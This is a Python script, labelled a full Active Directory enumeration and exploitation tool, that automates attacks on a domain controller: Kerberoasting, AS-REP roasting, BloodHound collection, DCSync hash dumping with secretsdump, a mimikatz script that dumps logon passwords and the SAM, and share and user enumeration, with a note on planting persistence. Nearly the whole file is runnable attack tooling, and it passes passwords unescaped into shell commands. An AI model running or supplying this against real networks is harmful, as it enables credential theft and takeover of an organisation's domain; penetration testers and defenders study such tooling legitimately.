#!/usr/bin/env python3

import os
import argparse
import subprocess

# Define all available modules
ALL_MODULES = [
    "recon", "enum_powerview", "enum_ldap", "enum_rpc", "smb_enum",
    "kerberoast", "asreproast", "bloodhound", "dcsync", "mimikatz",
    "gpp_password", "admin_check", "shares_enum", "users_enum",
    "trusts_enum", "privesc_checks", "persistence"
]

def run_cmd(command, outfile):
    os.makedirs(os.path.dirname(outfile), exist_ok=True)
    with open(outfile, "w") as f:
        subprocess.call(command, shell=True, stdout=f, stderr=f)

def recon(dc_ip, outdir):
    run_cmd(f"nmap -sV -Pn -p- {dc_ip}", f"{outdir}/nmap.txt")

def enum_powerview(outdir):
    run_cmd("echo '[+] Use PowerView.ps1 inside PowerShell session'", f"{outdir}/powerview.txt")

def enum_ldap(domain, dc_ip, outdir):
    run_cmd(f"ldapsearch -x -H ldap://{dc_ip} -b 'dc={domain.replace('.', ',dc=')}'", f"{outdir}/ldap.txt")

def enum_rpc(dc_ip, outdir):
    run_cmd(f"rpcclient -U '' {dc_ip} -N -c 'enumdomusers'", f"{outdir}/rpc.txt")

def smb_enum(dc_ip, outdir):
    run_cmd(f"smbclient -L \\\\{dc_ip}\\ -N", f"{outdir}/smbclient.txt")

def kerberoast(domain, user, password, dc_ip, outdir):
    run_cmd(f"GetUserSPNs.py {domain}/{user}:{password} -dc-ip {dc_ip} -outputfile {outdir}/spns.hashes", f"{outdir}/kerberoast.log")

def extract_users_enum4linux(dc_ip, userlist_path):
    print(f"[*] Running enum4linux-ng against {dc_ip} to discover users...")
    try:
        output = subprocess.check_output(f"enum4linux-ng {dc_ip}", shell=True).decode()
    except subprocess.CalledProcessError:
        print("[-] enum4linux-ng failed.")
        return []

    users = set()
    for line in output.splitlines():
        if "username:" in line.lower() or "[+]" in line.lower():
            parts = line.strip().split()
            for part in parts:
                if part.lower().startswith("svc-") or part.lower().startswith("admin") or part.isalnum():
                    users.add(part.lower())

    users = sorted(users)
    if users:
        os.makedirs(os.path.dirname(userlist_path), exist_ok=True)
        with open(userlist_path, "w") as f:
            for user in users:
                f.write(user + "\n")
        print(f"[+] Found {len(users)} usernames. Saved to {userlist_path}")
    else:
        print("[-] No valid usernames found.")
    
    return users

def asreproast(domain, userlist, dc_ip, outdir, auto_enum=False):
    if auto_enum:
        print("[*] No userlist provided. Attempting to auto-enumerate usernames...")
        userlist = f"{outdir}/autogen_users.txt"
        users = extract_users_enum4linux(dc_ip, userlist)
        if not users:
            print("[-] Skipping ASREPRoast. No usernames found.")
            return
    else:
        if not os.path.isfile(userlist):
            print(f"[-] Provided userlist {userlist} not found. Skipping ASREPRoast.")
            return

    os.makedirs(outdir, exist_ok=True)
    run_cmd(f"GetNPUsers.py {domain}/ -usersfile {userlist} -format hashcat -dc-ip {dc_ip}", f"{outdir}/asrep.txt")
    print(f"[+] ASREPRoast complete. Output saved to {outdir}/asrep.txt")

def bloodhound(domain, user, password, dc_ip, outdir):
    run_cmd(f"bloodhound-python -u {user} -p {password} -d {domain} -dc {dc_ip} -c all -o {outdir}", f"{outdir}/bloodhound.log")

def dcsync(domain, user, password, dc_ip, outdir):
    run_cmd(f"secretsdump.py {domain}/{user}:{password}@{dc_ip}", f"{outdir}/dcsync.txt")

def mimikatz_script(outdir):
    script = """
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
exit
"""
    os.makedirs(outdir, exist_ok=True)
    with open(f"{outdir}/mimikatz.txt", "w") as f:
        f.write(script)

def gpp_password(dc_ip, outdir):
    run_cmd(f"smbclient \\\\{dc_ip}\\SYSVOL -N -c 'recurse;prompt off;ls'", f"{outdir}/gpp.txt")

def admin_check(domain, user, password, dc_ip, outdir):
    run_cmd(f"crackmapexec smb {dc_ip} -u {user} -p {password}", f"{outdir}/admin_check.txt")

def shares_enum(dc_ip, outdir):
    run_cmd(f"smbmap -H {dc_ip}", f"{outdir}/shares.txt")

def users_enum(dc_ip, outdir):
    run_cmd(f"enum4linux-ng {dc_ip}", f"{outdir}/users.txt")

def trusts_enum(domain, user, password, dc_ip, outdir):
    run_cmd(f"crackmapexec ldap {dc_ip} -u {user} -p {password} --trusted-for-delegation", f"{outdir}/trusts.txt")

def privesc_checks(outdir):
    run_cmd("echo '[+] Run winPEAS.bat or SharpUp manually on the target'", f"{outdir}/privesc.txt")

def persistence(outdir):
    run_cmd("echo '[+] Consider adding scheduled tasks, new users, reg backdoors, etc.'", f"{outdir}/persistence.txt")

def main():
    parser = argparse.ArgumentParser(description="Full AD Enumeration and Exploitation Script")
    parser.add_argument("--dc-ip", required=True, help="Domain Controller IP")
    parser.add_argument("--domain", required=True, help="Domain name")
    parser.add_argument("-u", "--user", help="Username (optional)")
    parser.add_argument("-p", "--password", help="Password (optional)")
    parser.add_argument("--userlist", default="users.txt", help="User list for ASREPRoast")
    parser.add_argument("-m", "--modules", nargs='+', choices=ALL_MODULES, default=ALL_MODULES)
    parser.add_argument("-o", "--output", default="ad_output", help="Output directory")
    args = parser.parse_args()

    creds_provided = args.user and args.password
    base = args.output

    if 'recon' in args.modules: recon(args.dc_ip, f"{base}/recon")
    if 'enum_powerview' in args.modules and creds_provided: enum_powerview(f"{base}/powerview")
    if 'enum_ldap' in args.modules: enum_ldap(args.domain, args.dc_ip, f"{base}/ldap")
    if 'enum_rpc' in args.modules: enum_rpc(args.dc_ip, f"{base}/rpc")
    if 'smb_enum' in args.modules: smb_enum(args.dc_ip, f"{base}/smb")
    if 'kerberoast' in args.modules and creds_provided: kerberoast(args.domain, args.user, args.password, args.dc_ip, f"{base}/kerberoast")
    if 'asreproast' in args.modules:
        auto_enum = not args.userlist or args.userlist == 'users.txt'
        asreproast(args.domain, args.userlist, args.dc_ip, f"{base}/asreproast", auto_enum)
    if 'bloodhound' in args.modules and creds_provided: bloodhound(args.domain, args.user, args.password, args.dc_ip, f"{base}/bloodhound")
    if 'dcsync' in args.modules and creds_provided: dcsync(args.domain, args.user, args.password, args.dc_ip, f"{base}/dcsync")
    if 'mimikatz' in args.modules: mimikatz_script(f"{base}/mimikatz")
    if 'gpp_password' in args.modules: gpp_password(args.dc_ip, f"{base}/gpp")
    if 'admin_check' in args.modules and creds_provided: admin_check(args.domain, args.user, args.password, args.dc_ip, f"{base}/admincheck")
    if 'shares_enum' in args.modules: shares_enum(args.dc_ip, f"{base}/shares")
    if 'users_enum' in args.modules: users_enum(args.dc_ip, f"{base}/users")
    if 'trusts_enum' in args.modules and creds_provided: trusts_enum(args.domain, args.user, args.password, args.dc_ip, f"{base}/trusts")
    if 'privesc_checks' in args.modules: privesc_checks(f"{base}/privesc")
    if 'persistence' in args.modules: persistence(f"{base}/persistence")

    print(f"[+] All selected modules completed. Output saved in {base}/")

if __name__ == "__main__":
    main()

